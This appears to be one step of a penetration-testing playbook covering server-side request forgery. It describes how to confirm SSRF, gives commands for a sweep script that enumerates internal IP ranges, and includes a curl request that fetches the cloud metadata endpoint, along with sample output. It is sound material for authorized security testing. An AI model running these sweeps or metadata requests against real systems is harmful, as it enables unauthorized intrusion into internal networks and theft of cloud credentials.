# 11 - Server-Side Request Forgery (SSRF)

## Purpose
Enumerate internal network hosts by abusing a parameter that causes the server to make outbound HTTP requests on your behalf.

## Inputs
- `03_endpoints.json` — parameters that accept URLs (look for `url`, `fetch`, `api`, `endpoint`, `stockApi`, etc.)
- `04_fingerprint.json` — internal hostnames, metadata endpoints, cloud provider hints

## Testing Strategy

### Phase 1: Confirm SSRF
Verify the parameter triggers outbound requests before sweeping:
- Point it at a Burp Collaborator / interactsh callback URL
- If you get a DNS or HTTP hit, SSRF is confirmed
- Note the response differences between a reachable vs unreachable target

### Phase 2: Enumerate Internal Hosts
Sweep common private CIDR ranges for live hosts:
```
192.168.0.0/24   — typical lab / internal LAN
10.0.0.0/8       — broad internal range
172.16.0.0/12    — Docker / cloud internal
169.254.169.254  — AWS/GCP/Azure metadata endpoint (single IP, no sweep needed)
```

### Phase 3: Probe Discovered Hosts
Once a live host responds differently from the baseline, probe further paths:
- `/admin`, `/internal`, `/api`, `/metrics`, `/health`
- Cloud metadata: `/latest/meta-data/` (AWS), `/computeMetadata/v1/` (GCP)

## Commands

**Basic sweep — POST param, 192.168.0.0/24, port 8080, path /admin:**
```bash
python3 scripts/11_ssrf.py \
  --target https://example.com/product/stock \
  --param stockApi \
  --cookie "session=<val>" \
  --cidr 192.168.0.0/24 --port 8080 --path /admin
```

**GET param with extra header:**
```bash
python3 scripts/11_ssrf.py \
  --target https://example.com/fetch \
  --param url --method GET \
  --header "X-API-Key: secret" \
  --cidr 10.0.0.0/24 --port 80 --path / \
  --keyword "Internal"
```

**Extra body params alongside the SSRF param:**
```bash
python3 scripts/11_ssrf.py \
  --target https://example.com/api \
  --param fetch_url \
  --data "format=json" --data "version=2" \
  --cidr 172.16.0.0/24 --port 443 --path /api/admin
```

**AWS metadata endpoint (no sweep, single target):**
```bash
curl -s -X POST https://example.com/product/stock \
  --cookie "session=<val>" \
  --data "stockApi=http://169.254.169.254/latest/meta-data/"
```

## Flags Reference

| Flag | Default | Notes |
|------|---------|-------|
| `--target` | required | Full URL of the vulnerable endpoint |
| `--param` | required | Parameter name that triggers SSRF |
| `--method` | `POST` | `GET` or `POST` |
| `--cookie` | — | Full Cookie header, e.g. `session=abc; auth=xyz` |
| `--header NAME:VALUE` | — | Extra request header (repeatable) |
| `--data KEY=VALUE` | — | Extra body/query param alongside SSRF param (repeatable) |
| `--cidr` | `192.168.0.0/24` | CIDR block to enumerate |
| `--port` | `8080` | Port on each internal host |
| `--path` | `/admin` | Path to request on each internal host |
| `--keyword` | — | Flag responses containing this string (case-insensitive) |
| `--verbose` | off | Print every host, not just interesting ones |

## Detection Logic

The script sends one **baseline request** to `192.0.2.1` (RFC 5737 TEST-NET — guaranteed unreachable) and records the status code and body length. Every subsequent host is flagged as interesting if:

- Status code differs from baseline, **or**
- Body length differs by more than 50 bytes, **or**
- `--keyword` is found in the response body

## Expected Output

```
[*] Target   : https://example.com/product/stock
[*] Method   : POST  param=stockApi
[*] SSRF URL : http://<ip>:8080/admin
[*] Getting baseline (dead host: 192.0.2.1)...
[*] Sweeping 254 hosts in 192.168.0.0/24
[*] Baseline : HTTP 400  len=52

  [+] 192.168.0.57:8080/admin  HTTP 200  len=2341
  [+] 192.168.0.102:8080/admin  HTTP 302  len=0

[*] Sweep complete. 2 interesting host(s) found.

[+] Findings:
    http://192.168.0.57:8080/admin  HTTP 200  len=2341
    └─ <html><head><title>Admin Panel</title>...
    http://192.168.0.102:8080/admin  HTTP 302  len=0
```

## Vulnerable vs. Safe

**Vulnerable** — response differs when pointing at an internal IP vs an unreachable one: different status, different body length, or internal content leaked.

**Safe** — application validates the URL against an allowlist, rejects private IP ranges (RFC 1918), or strips/blocks the SSRF parameter entirely. All requests return identical responses regardless of the target IP.

## Safety Notes

- **Authorized targets only** — active enumeration, always validate scope first
- Keep requests sequential (no threading) to avoid triggering rate limits or WAF rules
- Stop and report immediately if credentials, tokens, or cloud metadata are returned
- Do not follow redirects by default (`allow_redirects=False`) — redirects to internal hosts are themselves a finding

## Execution Time

~3–8 minutes for a /24 (254 hosts) at 8s timeout per host in the worst case. In practice most hosts respond (or fail) in <1s.

## Next Step

Once a live internal host is found, enumerate its paths manually via the same SSRF parameter, or pipe the IP back into this script with different `--path` values.
